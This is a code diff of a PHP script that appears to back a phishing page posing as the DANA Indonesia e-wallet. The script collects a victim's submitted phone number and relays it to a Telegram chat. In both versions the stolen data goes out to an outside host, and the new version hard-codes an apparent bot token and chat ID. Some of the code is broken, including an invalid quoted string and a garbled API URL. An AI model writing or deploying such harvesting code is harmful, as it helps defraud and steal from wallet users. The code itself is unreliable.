@@ -1,11 +1,15 @@
 <?php
 
-session_start();
-include "./telegram.php";
- 
-$text = "├•★𝓓𝓪𝓷𝓪 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★". "\n├───────────────────". "\n<b>├•𖥔 ɴᴏᴍᴏʀ ʜᴘ : </b>".  $_POST['nomor']. "\n╰───────────────────";;
+require 'vendor/autoload.php';
 
-$query = http_build_query([
+use Telegram\Bot\Api;
+
+$botApiToken = '6285598536:AAG4BiGzBEI7pU3kv_S57UtNuwHAHulE_-M';
+$channelId ='5627477315';
+$text = '$_POST['nomor']';
+
+$telegram = new Api($botApiToken);
+$telegram->sendMessage([
+    'chat_id' => $channelId,
     'text' => $text,
 ]);
-$url = "https://api.telegram.org/bot{$botApiToken}/chat_id{$chat_id}/tezyparse_mode=html";
